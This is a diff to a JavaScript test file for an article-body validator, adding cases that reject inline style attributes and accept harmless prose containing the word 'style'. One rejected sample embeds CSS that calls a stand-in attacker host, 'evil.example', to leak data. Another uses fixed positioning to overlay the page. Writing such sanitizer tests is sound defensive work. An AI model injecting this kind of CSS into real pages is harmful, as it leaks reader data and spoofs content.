@@ -188,6 +188,18 @@ rejects(`Use define:pr${SOFT_HYPHEN}ops here.`, 'soft-hyphen unlisted define dir
 rejects('Intro.\n\n<div slot="sidebar">evil</div>', 'plain slot attribute');
 rejects('Intro.\n\n<  div   slot="sidebar">', 'spaced slot attribute');
 
+// Inline style attributes are blocked: the <style> element is already blocked,
+// but a style="" attribute on an allowed element still lets injected CSS
+// exfiltrate data, overlay the page, or spoof content with no script or scheme.
+rejects('Intro.\n\n<div style="background:url(//evil.example/?leak)">x</div>', 'plain style attribute');
+rejects('Intro.\n\n<  p   style = "position:fixed">x</p>', 'spaced style attribute');
+rejects('A link <a href="/wiki/stake/" style="color:red">stake</a> here.', 'style attribute on anchor');
+
+// Prose that merely mentions the word "style" without an attribute assignment
+// (including the "lifestyle" substring) must still pass.
+accepts('The visual style of the site is defined in a separate stylesheet.', 'benign style prose');
+accepts('A lifestyle choice is unrelated to CSS and must not be flagged.', 'benign lifestyle substring');
+
 // xmlns namespace attribute assignments must not appear in article bodies.
 rejects('Intro.\n\n<svg xmlns="http://www.w3.org/2000/svg"></svg>', 'plain xmlns attribute');
 rejects('Intro.\n\n<svg xmlns = "http://www.w3.org/2000/svg"></svg>', 'spaced equals xmlns attribute');
